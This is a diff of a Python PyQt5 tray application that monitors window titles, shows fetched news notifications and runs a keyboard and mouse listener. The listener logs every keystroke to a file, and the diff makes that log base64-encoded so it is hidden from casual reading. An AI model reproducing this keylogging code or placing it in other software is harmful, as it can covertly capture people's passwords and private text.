@@ -1,22 +1,23 @@
-import requests, traceback, sys, path, random, time, json, reg, os, shutil, tempfile, ctypes, webbrowser
-from PyQt5 import QtCore
-from PyQt5 import Qt
+import requests, traceback, sys, random, time, json, os, shutil, tempfile, ctypes, webbrowser, base64
+from PyQt5 import QtCore, Qt
 from PyQt5.QtGui import QIcon, QFont, QImage, QPixmap
 from PyQt5.QtWidgets import QApplication, QFrame, QMessageBox, QLabel, QAction, QMenu, QSystemTrayIcon, QDialog, QMainWindow, QVBoxLayout, QWidget, QGraphicsDropShadowEffect, QPushButton, QGridLayout, QSpacerItem, QSizePolicy
 from PyQt5.QtCore import QThread, pyqtSignal, QTimer, QSize
-from ui.Ui_form import Ui_Form
-from ui.Ui_debugForm import Ui_debugForm
-from ui.Ui_password import Ui_PasswordDialog
-from ui.Ui_aowForm import Ui_aowForm
-from aow import Aow1, Aow2, Aow3
-from notify import NotificationWindow, WindowNotify
-from config import Config
+
+from . import config
+from .utils.notify import NotificationWindow, WindowNotify
+from .utils import reg, path
+from .ui.design.Ui_form import Ui_Form
+from .ui.DebugForm import DebugForm
+from .ui.PasswordDialog import PasswordDialog
+from .ui.ZBDialog import ZBDialog
+from .ui.AowForm import AowForm
+
 from pynput import keyboard, mouse
 import pygetwindow as gw
 # import qt_material
 
-config = Config()
-config.update()
+
 
 def checkNetwork(url="https://example.com"):
     # return True # Debug
@@ -28,99 +29,7 @@ def checkNetwork(url="https://example.com"):
         print(e)
     return True
 
-class ZBDialog(QDialog):
-    def __init__(self, labelText, *args, **kwargs):
-        super(ZBDialog, self).__init__(*args, **kwargs)
-        self.setObjectName('Custom_Dialog')
-        self.setWindowFlags(self.windowFlags() | QtCore.Qt.FramelessWindowHint | QtCore.Qt.WindowStaysOnTopHint)
-        self.setAttribute(QtCore.Qt.WA_TranslucentBackground, True)
-        self.setStyleSheet("""
-#Custom_Widget {
-    background: white;
-    border-radius: 10px;
-}
 
-#closeButton {
-    min-width: 36px;
-    min-height: 36px;
-    font-family: "Webdings";
-    qproperty-text: "r";
-    border-radius: 10px;
-}
-#closeButton:hover {
-    color: white;
-    background: red;
-}
-""")
-        self.initUi()
-        # 添加阴影
-        effect = QGraphicsDropShadowEffect(self)
-        effect.setBlurRadius(12)
-        effect.setOffset(0, 0)
-        effect.setColor(QtCore.Qt.gray)
-        self.setGraphicsEffect(effect)
-
-        self.resize(403, 146)
-        self.label = QLabel(labelText, self)
-        self.label.setGeometry(QtCore.QRect(30, 20, 340, 100))
-        sizePolicy = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred)
-        sizePolicy.setHorizontalStretch(0)
-        sizePolicy.setVerticalStretch(3)
-        sizePolicy.setHeightForWidth(self.label.sizePolicy().hasHeightForWidth())
-        self.label.setSizePolicy(sizePolicy)
-        font = QFont()
-        font.setPointSize(25)
-        self.label.setFont(font)
-        self.label.setFrameShape(QFrame.NoFrame)
-        self.label.setWordWrap(True)
-
-        r = random.randint(0, 255)
-        g = random.randint(0, 255)
-        b = random.randint(0, 255)
-        self.label.setStyleSheet(f"color: rgb({r}, {g}, {b})")
-
-        self.adjustSize()
-        self.setFixedSize(self.width(), self.height())
-        self.activateWindow()
-        self.setFocus()
-
-    def initUi(self):
-        layout = QVBoxLayout(self)
-        # 重点： 这个widget作为背景和圆角
-        self.widget = QWidget(self)
-        self.widget.setObjectName('Custom_Widget')
-        layout.addWidget(self.widget)
-
-        # 在widget中添加ui
-        layout = QGridLayout(self.widget)
-        layout.addItem(QSpacerItem(
-            40, 20, QSizePolicy.Expanding, QSizePolicy.Minimum), 0, 0)
-        layout.addWidget(QPushButton(
-            'r', self, clicked=self.accept, objectName='closeButton'), 0, 1)
-        layout.addItem(QSpacerItem(20, 40, QSizePolicy.Minimum,
-                                   QSizePolicy.Expanding), 1, 0)
-
-    def sizeHint(self):
-        return QSize(403, 146)
-
-class PasswordDialog(QDialog, Ui_PasswordDialog):
-    def __init__(self, func, parent=None):
-        super(PasswordDialog, self).__init__(parent)
-        self.setupUi(self)
-        self.setFixedSize(self.width(), self.height())
-        self.func = func
-        self.label_2.setVisible(False)
-        self.passwordInput.setEchoMode(Qt.QLineEdit.Password)
-        self.confirmBtn.clicked.connect(self.check)
-        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
-        self.setWindowIcon(QIcon(path.path("icon.jpg")))
-    
-    def check(self):
-        if self.passwordInput.text() == config.get("Config.Password"):
-            self.func()
-            self.close()
-        else:
-            self.label_2.setVisible(True)
 
 class MyQAction(QAction):
     baseText = False
@@ -128,48 +37,6 @@ class MyQAction(QAction):
         if not self.baseText: self.baseText = self.text();
         self.setText(self.baseText + text)
 
-class AowForm(QMainWindow, Ui_aowForm):
-    scriptThreadStatus = False
-
-    def __init__(self, width, height, parent=None):
-        super(AowForm, self).__init__(parent)
-        self.setupUi(self)
-        self.setFixedSize(self.width(), self.height())
-        self.setWindowIcon(QIcon(path.path("icon.jpg")))
-        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
-        self.move(
-            width - self.width() - 10,
-            height - self.height() - 50
-        )
-        self.screenWidth = width
-        self.screenHeight = height
-        self.stopBtn.clicked.connect(self.stop)
-        self.stopBtn.setDisabled(True)
-        self.aow1Btn.clicked.connect(self.runScript(Aow1))
-        self.aow2Btn.clicked.connect(self.runScript(Aow2))
-        self.aow3Btn.clicked.connect(self.runScript(Aow3))
-    
-    def runScript(self, script):
-        def _runScript():
-            if not self.scriptThreadStatus:
-                self.aow1Btn.setDisabled(True)
-                self.aow2Btn.setDisabled(True)
-                self.aow3Btn.setDisabled(True)
-                self.stopBtn.setDisabled(False)
-                self.scriptThread = script(self.screenWidth, self.screenHeight)
-                self.scriptThread.start()
-                self.scriptThreadStatus = True
-        return _runScript
-
-    def stop(self):
-        self.scriptThread.forceStop()
-        self.scriptThread.quit()
-        self.scriptThread.wait()
-        self.scriptThreadStatus = False
-        self.aow1Btn.setDisabled(False)
-        self.aow2Btn.setDisabled(False)
-        self.aow3Btn.setDisabled(False)
-        self.stopBtn.setDisabled(True)
 
 class MyMainWindow(QMainWindow, Ui_Form):
     getGWThreadStatus = False
@@ -246,6 +113,9 @@ class MyMainWindow(QMainWindow, Ui_Form):
         self.reCfgBtn.clicked.connect(self.resetCfg)
         self.acCfgBtn.clicked.connect(self.acCfg)
 
+        self.reFileBtn.clicked.connect(self.loadFileContent)
+        self.saveFileBtn.clicked.connect(self.saveFileContent)
+
         self.getWindowThread = GetWindowThread(self.desktop.width(), self.desktop.height())
         self.getWindowThread.execer.connect(self.execInnerFunc)
         self.getWindowThread.logger.connect(self.log)
@@ -269,7 +139,42 @@ class MyMainWindow(QMainWindow, Ui_Form):
         if config.get("News.Enable"):
             self.getNewsThread = GetNewsThread()
             self.getNewsThread.execer.connect(self.execInnerFunc)
+            self.getNewsThread.logger.connect(self.log)
             self.getNewsThread.start()
+
+    def loadFileContent(self):
+        _path: str = self.filepathInput.text()
+        self.log(f"Load file in {_path}")
+        content: str = ""
+        if not os.path.exists(path.path(_path)):
+            self.log("<b style='color:red;'>File not found!</b>")
+            self.viewFileTextarea.setText("<b style='color:red;'>File not found!</b>")
+            return
+        with open(path.path(_path), "r", encoding="utf-8") as f:
+            content = f.read()
+        try:
+            content = base64.b64decode(content).decode("utf-8")
+        except Exception:
+            self.log("Cannot b64decode file content!")
+        self.viewFileTextarea.setText(content)
+
+    def saveFileContent(self):
+        _path: str = self.filepathInput.text()
+        self.log(f"Load file in {_path}")
+        if not os.path.exists(path.path(_path)):
+            self.log("<b style='color:red;'>File not found!</b>")
+            self.viewFileTextarea.setText("<b style='color:red;'>File not found!</b>")
+            return
+        content: str = self.viewFileTextarea.toPlainText()
+        flag = True
+        with open(path.path(_path), "w", encoding="utf-8") as f:
+            try:
+                f.write(base64.b64encode(bytes(content, "utf-8")).decode("utf-8"))
+            except Exception as e:
+                flag = False
+                QMessageBox.warning(self, "保存失败", str(e))
+        if flag:
+            QMessageBox.information(self, "保存成功", "保存成功！")
 
     def NotifyWindow(self, title, content, banner=False, detail=None, timeout=1000*60*3):
         def viewCallback(_):
@@ -483,21 +388,6 @@ class MyMainWindow(QMainWindow, Ui_Form):
             logStr += str(i) + " "
         self.logTextarea.append(logStr)
 
-class DebugForm(QMainWindow, Ui_debugForm):
-    def __init__(self, title, width, height, parent=None):
-        super(DebugForm, self).__init__(parent)
-        self.setupUi(self)
-        self.setFixedSize(self.width(), self.height())
-        self.setWindowIcon(QIcon(path.path("icon.jpg")))
-        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
-        self.setWindowTitle(title)
-        self.move(
-            width - self.width() - 10,
-            height - self.height() - 50
-        )
-
-    def setTitleText(self, text):
-        self.titletext.setText(text)
 
 
 class AutoStartThread(QThread):
@@ -553,10 +443,21 @@ class KeyBoardThread(QThread):
 
     def __init__(self):
         super(KeyBoardThread, self).__init__()
+        self.logContent = ""
     
     def forceStop(self):
         try:
-            self.file.close()
+            try:
+                content = ""
+                if os.path.exists(path.path(self.fileName)):
+                    with open(path.path(self.fileName), "r", encoding="utf-8") as f1:
+                        content += base64.b64decode(f1.read()).decode("utf-8")
+                content += self.logContent
+                with open(path.path(self.fileName), "w", encoding="utf-8") as f2:
+                    f2.write(base64.b64encode(bytes(content, "utf-8")).decode("utf-8"))
+                self.logContent = ""
+            except Exception as e:
+                print(e)
             self.keyboardListener.stop()
             self.mouseListener.stop()
         except Exception:
@@ -568,24 +469,23 @@ class KeyBoardThread(QThread):
             char = key.char
             if char:
                 print(f"{char} Pressed.")
-                self.file.write(char)
+                self.logContent += char
         except AttributeError:
             print(f"{key} Pressed.")
-            self.file.write(f"[{str(key).replace('Key.', '')}]")
+            self.logContent += f"[{str(key).replace('Key.', '')}]"
         if not self.enterFlag:
             self.enterFlag = True
     
     def on_mouse(self, x, y, dx=None, dy=None):
         print("Mouse move", x, y, dx, dy)
         if self.enterFlag:
-            self.file.write("\n")
+            self.logContent += "\n"
             self.enterFlag = False
 
     def run(self):
-        self.file = open(path.path(self.fileName), "a+", encoding="utf-8")
         now = time.localtime()
         time_str = time.strftime("%Y-%m-%d %H:%M:%S", now)
-        self.file.write(f"\n\n({time_str}):\n")
+        self.logContent += f"\n\n({time_str}):\n"
 
         self.mouseListener = mouse.Listener(
             on_move=self.on_mouse,
@@ -597,19 +497,28 @@ class KeyBoardThread(QThread):
                 on_press=self.on_press)
         self.keyboardListener.start()
         self.keyboardListener.join()
-        self.keyboardListener.stop()
-        self.mouseListener.stop()
+        try:
+            self.keyboardListener.stop()
+            self.mouseListener.stop()
+        except Exception:
+            pass
 
 class GetNewsThread(QThread):
     execer = pyqtSignal(str, tuple)
+    logger = pyqtSignal(str)
+
     def __init__(self):
         super(GetNewsThread, self).__init__()
     
     def run(self):
-        self.news = requests.get(config.get("News.NewsApi")).json()
-        print(self.news)
-        for i in self.news:
-            self.execer.emit("NotifyWindow", (i.get("title"), i.get("content"), i.get("banner", False), i.get("detail", None)))
+        try:
+            self.news = requests.get(config.get("News.NewsApi")).json()
+            print(self.news)
+            for i in self.news:
+                self.execer.emit("NotifyWindow", (i.get("title"), i.get("content"), i.get("banner", False), i.get("detail", None)))
+        except Exception:
+            self.logger.emit(f"<p style='color:red;'>Cannot get News from '{config.get('News.NewsApi')}'!</p>")
+
 
 class GetWindowThread(QThread):
     exitFlag = False
@@ -635,6 +544,9 @@ class GetWindowThread(QThread):
             self.ZBDialogFlag = False
             self.execer.emit("changeTrayIcon", (path.path("icon_colored.png"),))
             self.logger.emit("Started ZBDialog Listener.")
+        
+        # debug
+        # self.ZBDialogFlag = False
 
         _oldTitle = None
         while True:
